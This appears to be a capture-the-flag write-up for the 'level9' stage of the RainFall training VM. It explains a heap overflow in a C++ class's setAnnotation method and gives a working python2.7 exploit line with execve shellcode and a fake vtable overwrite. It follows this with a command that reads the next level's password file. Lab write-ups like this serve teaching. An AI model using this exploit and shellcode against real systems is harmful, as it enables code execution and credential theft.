# level9 → bonus0

Each `N` object is 108 bytes: a four-byte vtable pointer, 100 annotation
bytes, and a four-byte value. `setAnnotation` uses `strlen` and then
`memcpy` without checking the 100-byte annotation size. The two objects
are adjacent on the VM heap. Starting at the first object's annotation,
108 bytes reach the second object's vtable pointer.

The payload places a fake one-entry vtable at `0x0804a00c`; that entry
points at shellcode at `0x0804a010`. After 104 bytes of shellcode and NOP
padding, it replaces the second object's vtable pointer with `0x0804a00c`.
The subsequent virtual `operator+` call then jumps to the shellcode.
These heap addresses and heap execution are properties of the supplied VM.

From the level9 account on the RainFall VM:

```sh
(
  cat
) | ./level9 "$(python2.7 -c 'import struct
sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
print struct.pack("<I",0x0804a010) + sc.ljust(104,"\x90") + struct.pack("<I",0x0804a00c)')"
id
cat /home/user/bonus0/.pass
```

In GDB, `disassemble N::setAnnotation` shows the unchecked `memcpy`;
`disassemble main` shows the virtual call. Inspect the two `new` results
and their vtable pointers to confirm the offset and addresses.
